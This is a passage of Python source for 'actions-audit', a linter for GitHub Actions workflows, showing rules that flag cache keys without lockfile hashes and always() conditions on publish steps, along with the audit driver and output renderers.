                         % (job_id, _snippet(ref, 60))),
                fix=("Set 'ref:' to an explicit commit SHA of trusted code, or "
                     "consume only a named artifact and verify it before use."),
                evidence=ctx.evidence(line),
            ))
    return findings


@rule(
    "cache-key-no-lockfile",
    "Cache key does not include a lockfile hash",
    "low",
    "A cache key with no dependency-lockfile hash (or no key at all) is reused "
    "across unrelated dependency versions. The restored cache can then hold stale "
    "or wrong packages, producing builds that fail or, worse, pass against "
    "dependencies nobody reviewed. On pull_request workflows a cache written by "
    "one run can be read by another, so a poisoned entry can survive into a "
    "trusted run.",
    "Include a lockfile hash in the key, for example "
    "'key: ${{ runner.os }}-node-${{ hashFiles(\"**/package-lock.json\") }}' "
    "with a restore-keys prefix, and use the setup-* 'cache:' input (which does "
    "this for you) instead of hand-rolled caching.",
    ("reliability", "supply-chain"),
)
def check_cache_key(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        step_list = list(iterate_steps(job))
        for index, step in step_list:
            uses = str(step.get("uses") or "")
            with_block = step.get("with")
            with_block = with_block if isinstance(with_block, dict) else {}
            action = uses.split("@")[0]
            step_line = ctx.line_of(ctx.step_path(job_id, index))
            start, end = ctx.step_span(job_id, index, len(step_list))
            line = step_line
            if CACHE_ACTION_RE.match(uses):
                key = with_block.get("key")
                if key is None:
                    findings.append(Finding(
                        rule_id="cache-key-no-lockfile",
                        severity="low",
                        path=ctx.display_path,
                        line=line,
                        message=("actions/cache step in job %r has no key, so the "
                                 "cache cannot be invalidated on dependency "
                                 "changes." % job_id),
                        fix=("Always set key: with a hashFiles() lockfile hash and "
                             "a restore-keys fallback prefix."),
                        evidence=ctx.evidence(line),
                    ))
                    continue
                if LOCKFILE_RE.search(str(key)):
                    continue
                line = (ctx.find_line(r"^\s*key\s*:", start, end) or step_line)
                findings.append(Finding(
                    rule_id="cache-key-no-lockfile",
                    severity="low",
                    path=ctx.display_path,
                    line=line,
                    message=("Cache key %r in job %r contains no dependency "
                             "lockfile hash." % (_snippet(key, 60), job_id)),
                    fix=("Add a lockfile hash to the key, e.g. "
                         "'${{ runner.os }}-${{ hashFiles(\"**/package-lock.json\") }}', "
                         "and keep a restore-keys prefix."),
                    evidence=_snippet(key, 100),
                ))
                continue
            if action in SETUP_CACHE_ACTIONS:
                cache = with_block.get("cache")
                if cache is None:
                    continue
                if LOCKFILE_RE.search(str(with_block.get("cache-dependency-path") or "")):
                    continue
                line = (ctx.find_line(r"^\s*cache\s*:", start, end) or step_line)
                findings.append(Finding(
                    rule_id="cache-key-no-lockfile",
                    severity="low",
                    path=ctx.display_path,
                    line=line,
                    message=("%s is caching %r in job %r without a lockfile path "
                             "in cache-dependency-path." % (action, cache, job_id)),
                    fix=("Point cache-dependency-path at the lockfile (e.g. "
                         "package-lock.json) so the cache key tracks dependency "
                         "versions."),
                    evidence=ctx.evidence(line),
                ))
    return findings


@rule(
    "always-on-publish",
    "if: always() on a step that publishes or deploys",
    "medium",
    "always() makes a step run even when an earlier step failed or the run was "
    "cancelled. On a publish or deploy step that means shipping a build produced "
    "from a broken pipeline -- the classic 'released a half-tested artifact' "
    "failure.",
    "Gate publishing on success: use 'if: success()' (the default) or "
    "'if: !cancelled() && steps.build.outcome == \\'success\\''. Reserve "
    "always() for diagnostics, log collection and notifications.",
    ("reliability",),
)
def check_always_publish(ctx: WorkflowContext) -> List[Finding]:
    findings: List[Finding] = []
    for job_id, job in ctx.jobs.items():
        step_list = list(iterate_steps(job))
        for index, step in step_list:
            condition = step.get("if")
            if not isinstance(condition, str):
                continue
            if "always()" not in condition:
                continue
            if not step_looks_like_deploy(step):
                continue
            start, end = ctx.step_span(job_id, index, len(step_list))
            line = (ctx.find_line(r"^\s*if\s*:.*always\(\)", start, end)
                    or ctx.line_of(ctx.step_path(job_id, index)))
            findings.append(Finding(
                rule_id="always-on-publish",
                severity="medium",
                path=ctx.display_path,
                line=line,
                message=("Step %r in job %r publishes or deploys but is guarded "
                         "by if: %s, so it runs after failures too."
                         % (step.get("name") or step.get("uses"), job_id,
                            _snippet(condition, 60))),
                fix=("Use 'if: success()' for publish/deploy steps; keep "
                     "always() only for notifications and log uploads."),
                evidence=ctx.evidence(line),
            ))
    return findings


# --------------------------------------------------------------------------
# Audit driver
# --------------------------------------------------------------------------

WORKFLOW_GLOBS = (".yml", ".yaml")


def audit_source(path: str, display_path: str, source: str,
                 prefer_native: bool = False) -> Tuple[List[Finding], Dict[str, Any]]:
    """Audit one workflow source string.

    Returns ``(findings, meta)``.  Raises :class:`RuleError` when the file is not
    parseable YAML or not a workflow-shaped mapping.
    """
    try:
        data, lines, backend = miniyaml.load_string(source, prefer_native=prefer_native)
    except YamlError as exc:
        raise RuleError("%s: %s" % (display_path, exc)) from exc
    if not isinstance(data, dict):
        raise RuleError("%s: top level of a workflow must be a mapping, found %s"
                        % (display_path, type(data).__name__))
    ctx = WorkflowContext(
        path=path,
        display_path=display_path,
        source=source,
        data=data,
        lines=lines,
        backend=backend,
        on_key=miniyaml.on_key_kind(data),
        source_lines=source.replace("\r\n", "\n").replace("\r", "\n").split("\n"),
    )
    findings: List[Finding] = []
    for registered in RULES:
        findings.extend(registered.check(ctx))
    findings.sort(key=lambda f: (-SEVERITY_RANK[f.severity], f.rule_id, f.line))
    meta = {
        "backend": backend,
        "on_key_parsed_as": ctx.on_key,
        "triggers": sorted(ctx.triggers),
        "jobs": sorted(ctx.jobs),
        "has_jobs": bool(ctx.jobs),
    }
    return findings, meta


def find_workflow_files(root: str) -> List[str]:
    """Resolve a CLI path to the workflow files it denotes."""
    if os.path.isfile(root):
        return [root]
    if not os.path.isdir(root):
        raise RuleError("path does not exist: %s" % root)
    direct = os.path.join(root, ".github", "workflows")
    if os.path.isdir(direct):
        base = direct
    elif os.path.basename(os.path.normpath(root)) == "workflows":
        base = root
    else:
        # A directory that is not a repository: still accept it if it holds
        # workflow-looking files directly.
        base = root
    found: List[str] = []
    for entry in sorted(os.listdir(base)):
        full = os.path.join(base, entry)
        if os.path.isfile(full) and entry.lower().endswith(WORKFLOW_GLOBS):
            found.append(full)
    if not found:
        raise RuleError("no workflow files (*.yml, *.yaml) found under %s" % base)
    return found


def expand_paths(paths: Sequence[str]) -> List[str]:
    seen: List[str] = []
    for path in paths:
        for found in find_workflow_files(path):
            if found not in seen:
                seen.append(found)
    return seen


def audit_paths(paths: Sequence[str], prefer_native: bool = False,
                base_dir: Optional[str] = None) -> Tuple[List[Finding], List[Dict[str, Any]]]:
    """Audit every workflow file denoted by ``paths``."""
    files = expand_paths(paths)
    findings: List[Finding] = []
    metas: List[Dict[str, Any]] = []
    for path in files:
        try:
            with open(path, "r", encoding="utf-8") as handle:
                source = handle.read()
        except OSError as exc:
            raise RuleError("cannot read %s: %s" % (path, exc)) from exc
        if source.startswith("\ufeff"):
            source = source[1:]
        display = os.path.relpath(path, base_dir) if base_dir else path
        file_findings, meta = audit_source(path, display, source,
                                           prefer_native=prefer_native)
        meta["file"] = display
        meta["findings"] = len(file_findings)
        findings.extend(file_findings)
        metas.append(meta)
    return findings, metas


def summarize(findings: Sequence[Finding]) -> Dict[str, int]:
    summary = {level: 0 for level in SEVERITIES}
    for finding in findings:
        summary[finding.severity] += 1
    summary["total"] = len(findings)
    return summary


def rule_catalogue() -> List[Dict[str, Any]]:
    return [rule_.as_dict() for rule_ in RULES]


# --------------------------------------------------------------------------
# Rendering
# --------------------------------------------------------------------------

_COLOURS = {"high": "\033[31m", "medium": "\033[33m", "low": "\033[36m"}
_RESET = "\033[0m"


def render_human(findings: Sequence[Finding], metas: Sequence[Dict[str, Any]],
                 quiet: bool = False, colour: bool = False) -> str:
    lines: List[str] = []
    by_file: Dict[str, List[Finding]] = {}
    for finding in findings:
        by_file.setdefault(finding.path, []).append(finding)
    if not quiet:
        for meta in metas:
            backend = meta["backend"]
            on_key = meta["on_key_parsed_as"] or "absent"
            lines.append("%s" % meta["file"])
            lines.append("  yaml backend: %s   trigger key 'on:' parsed as: %s"
                         % (backend, on_key))
            if meta["triggers"]:
                lines.append("  events: %s" % ", ".join(meta["triggers"]))
            if meta["on_key_parsed_as"] == "true":
                lines.append("  note: YAML 1.1 readers turn the unquoted key 'on:' "
                             "into the boolean true; actions-audit normalises it "
                             "back to the 'on' trigger block.")
            lines.append("")
    for path in sorted(by_file):
        for finding in by_file[path]:
            tag = finding.severity.upper()
            if colour:
                tag = "%s%s%s" % (_COLOURS[finding.severity], tag, _RESET)
            lines.append("%s:%d: [%s] %s: %s"
                         % (finding.path, finding.line, tag, finding.rule_id,
                            finding.message))
            lines.append("    fix: %s" % finding.fix.replace("\n", "\n         "))
    summary = summarize(findings)
    while lines and lines[-1] == "":
        lines.pop()
    lines.append("")
    lines.append("%d finding(s): %d high, %d medium, %d low"
                 % (summary["total"], summary["high"], summary["medium"],
                    summary["low"]))
    return "\n".join(lines)


def render_json(findings: Sequence[Finding], metas: Sequence[Dict[str, Any]],
                tool_version: str) -> str:
    payload = {
        "tool": "actions-audit",
        "version": tool_version,
        "summary": summarize(findings),
        "files": metas,
        "findings": [finding.as_dict() for finding in findings],
    }
    return json.dumps(payload, indent=2, sort_keys=False)
